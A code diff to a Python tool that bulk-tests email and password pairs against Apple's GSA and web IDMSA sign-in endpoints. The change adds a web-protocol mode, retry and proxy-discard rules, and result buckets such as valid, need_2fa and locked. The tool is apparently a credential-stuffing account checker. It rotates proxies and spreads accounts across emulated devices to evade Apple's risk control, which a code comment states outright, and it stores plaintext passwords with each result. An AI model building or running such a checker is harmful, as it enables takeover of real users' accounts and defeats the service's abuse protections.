@@ -265,6 +265,37 @@ def _refine_repair_auth_with_rotation(result, email, password, proxy, timeout,
     return refined
 
 
+def _check_web_auth(email, password, proxy, timeout, cancel, checker=None):
+    """Run Web/IDMSA as the primary protocol and retain safe response metadata."""
+    if checker is None:
+        from fastcheck.protocols.idmsa import check as checker
+    latest = {}
+
+    def remember(event):
+        if isinstance(event, dict) and event.get('stage') in ('init', 'complete'):
+            latest.clear()
+            latest.update(event)
+
+    result = checker(email, password, proxy, timeout=timeout, retries=0,
+                     cancel=cancel, trace=remember)
+    result = dict(result) if isinstance(result, dict) else {
+        'status': 'error', 'kind': 'protocol', 'detail': 'Web 协议未返回结果'}
+    if latest:
+        result['http'] = latest.get('http')
+        if latest.get('auth_type'):
+            result['auth_type'] = latest['auth_type']
+        codes = list(latest.get('service_error_codes') or [])
+        if len(codes) == 1:
+            try:
+                result['apple_ec'] = int(codes[0])
+            except (TypeError, ValueError):
+                pass
+        result['_web_attempts'] = max(1, int(latest.get('attempt') or 1))
+    else:
+        result['_web_attempts'] = 1
+    return result
+
+
 def _write_proxy_debug(path, event, **fields):
     """Append one bounded JSONL event without ever persisting proxy credentials."""
     if not path:
@@ -1318,6 +1349,12 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
     started = time.time()
     output_path = directory / 'results.jsonl'
     DevicePool, gsa_check, result_bucket = _load_fastcheck()
+    auth_protocol = str(descriptor.get('_auth_protocol') or 'gsa').strip().lower()
+    if auth_protocol not in ('gsa', 'web'):
+        auth_protocol = 'gsa'
+    web_check = None
+    if auth_protocol == 'web':
+        from fastcheck.protocols.idmsa import check as web_check
     proxy = descriptor.get('proxy')
     proxies = []
     if descriptor.get('proxy_api') and proxy_pool is None:
@@ -1371,12 +1408,22 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
                            threads=workers, configured_threads=configured_workers,
                            worker_nice=int(descriptor.get('_worker_nice') or 0),
                            retries=retries, timeout=timeout,
-                           slots=slot_ids, credentials_recorded=False)
+                           slots=slot_ids, auth_protocol=auth_protocol,
+                           credentials_recorded=False)
 
     # 一个包内把账号摊到所有设备上：一台设备只承担 rows/capacity 条，
     # 比固定用 1 号设备更分散，明显降低单设备被风控的概率。
     identities, infos, device_labels = {}, {}, {}
     for index in slot_ids:
+        if auth_protocol == 'web':
+            infos[index] = None
+            identities[index] = None
+            try:
+                device_labels[index] = _device_id_label(
+                    pool.inspect(index).get('device_id'))
+            except Exception:                                     # noqa: BLE001
+                device_labels[index] = ''
+            continue
         bootstrap_before = _proxy_pool_snapshot(proxy_pool) if debug_enabled else {}
         bootstrap_started = time.monotonic() if debug_enabled else None
         bootstrap_lease = proxy_pool.acquire(wait=2.0) if proxy_pool is not None else None
@@ -1478,7 +1525,8 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
             apple_ec = None
         # 没拿到 HTTP 响应、服务不可用、Apple 明确要求稍后再试，或
         # Anisette/设备环境失效时重试。重试次数仍严格受用户设置控制。
-        return (http in (0, 503)
+        return ((auth_protocol == 'web' and http in (0, 500, 502, 503, 504))
+                or http in (0, 503)
                 or apple_ec in (-22421, -22410, -332000, -33200, -3000303)
                 or apple_retry_later(result))
 
@@ -1487,8 +1535,19 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
             http = int(result.get('http'))
         except (TypeError, ValueError):
             http = None
-        if http in (0, 503):
+        if http in (0, 503) or (auth_protocol == 'web'
+                                and http in (500, 502, 504)):
             return 'timeout'
+        if auth_protocol == 'web':
+            status = str(result.get('status') or '').strip().casefold()
+            direct = {
+                'valid': 'valid', 'need_2fa': 'need_2fa',
+                'wrong_password': 'wrong_password',
+                'locked': 'locked', 'security_lock': 'locked',
+                'not_found': 'not_found',
+            }
+            if status in direct:
+                return direct[status]
         bucket = result_bucket(result)
         # 没有命中内置英文原因的结果保留为“其他错误”，
         # 不再因某个 Apple ec 错误码而猜测账号已失效。
@@ -1559,7 +1618,7 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
                 return row, line, result
             request_started = time.monotonic() if debug_enabled else None
             try:
-                if identity is None:
+                if auth_protocol == 'gsa' and identity is None:
                     # 预取失败的槽位在这里补一次
                     info = pool.info(timeout, proxy=account_proxy, provider_direct=True)
                     ready = pool.inspect(slot_id)['state'] == 'ready'
@@ -1572,11 +1631,19 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
                     if not ready and pool.inspect(slot_id)['state'] == 'ready':
                         record_device_registration(device_root, slot_id, account_proxy,
                                                    profile.get('model', ''))
-                # 换 IP 重试由节点池处理，协议层每次只使用当前出口一次。
-                result = gsa_check(account, password, account_proxy, timeout=timeout,
-                                   retries=0 if proxy_pool is not None else retries,
-                                   cancel=stop.is_set, identity=identity)
-                if descriptor.get('_web_secondary_auth'):
+                # 主协议由系统设置固化到任务；Web 模式不先发 GSA 请求。
+                if auth_protocol == 'web':
+                    result = _check_web_auth(
+                        account, password, account_proxy, timeout,
+                        stop.is_set, checker=web_check)
+                else:
+                    result = gsa_check(account, password, account_proxy, timeout=timeout,
+                                       retries=0 if proxy_pool is not None else retries,
+                                       cancel=stop.is_set, identity=identity)
+                # 仅兼容旧总控下发的历史描述；带 _auth_protocol 的新任务
+                # 始终只运行所选主协议。
+                if (auth_protocol == 'gsa' and '_auth_protocol' not in descriptor
+                        and descriptor.get('_web_secondary_auth')):
                     def rotate_web(web_attempt):
                         nonlocal account_proxy, lease, current_proxy
                         if proxy_pool is not None:
@@ -1628,7 +1695,10 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
             # three-strike policy used outside this retry branch.
             # 明确重试条件都淘汰当前出口，等待 5 秒后从池中获取
             # 另一条 IP；否则刚释放的健康租约可能被同一账号再次拿到。
-            immediate_discard = (result_http in (0, 503) or web_failed
+            immediate_discard = (result_http in (0, 503)
+                                 or (auth_protocol == 'web'
+                                     and result_http in (500, 502, 504))
+                                 or web_failed
                                  or apple_ec in (-22410, -332000, -33200, -3000303)
                                  or apple_retry_later(result))
             healthy_exit = result_http not in (None, 0, 407) and not web_failed
@@ -1670,7 +1740,8 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
                     release=('discarded' if immediate_discard else
                              ('reusable' if healthy_exit else 'failure_recorded')),
                     pool_before=acquire_before, pool_after=_proxy_pool_snapshot(proxy_pool))
-            if apple_ec in (-22421, -22410, -332000, -33200, -3000303):
+            if (auth_protocol == 'gsa'
+                    and apple_ec in (-22421, -22410, -332000, -33200, -3000303)):
                 # 这不是账号结论；下一次重新获取 Anisette 身份，避免用
                 # 同一份无效设备认证数据重复请求。
                 identity = None
@@ -1782,16 +1853,20 @@ def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
                 if business_code is None:
                     business_code = (result.get('detail') or result.get('kind') or '')[:180]
                 reason = _apple_reason_for_record(result, status, debug_enabled)
-                usage_counts[device] += 1
-                device_usage = int(usage_start.get(device, 0)) + usage_counts[device]
+                if auth_protocol == 'gsa':
+                    usage_counts[device] += 1
+                    device_usage = int(usage_start.get(device, 0)) + usage_counts[device]
+                else:
+                    device = None
+                    device_usage = None
                 record = {'row': row, 'account': account, 'password': password, 'status': status,
                           'sha256': hashlib.sha256(raw_line).hexdigest(), 'bytes': len(raw_line),
                           'stage': result.get('stage') or '', 'http': result.get('http'),
                           'code': str(business_code)[:180], 'reason': reason,
-                          'protocol': 'GSA',
+                          'protocol': auth_protocol.upper(),
                           'device': device,
-                          'device_key': result.get('device_key') or '',
-                          'device_label': device_labels.get(device, ''),
+                          'device_key': (result.get('device_key') or '') if device else '',
+                          'device_label': device_labels.get(device, '') if device else '',
                           'device_usage': device_usage,
                           'elapsed': result.get('elapsed'),
                           'attempts': max(
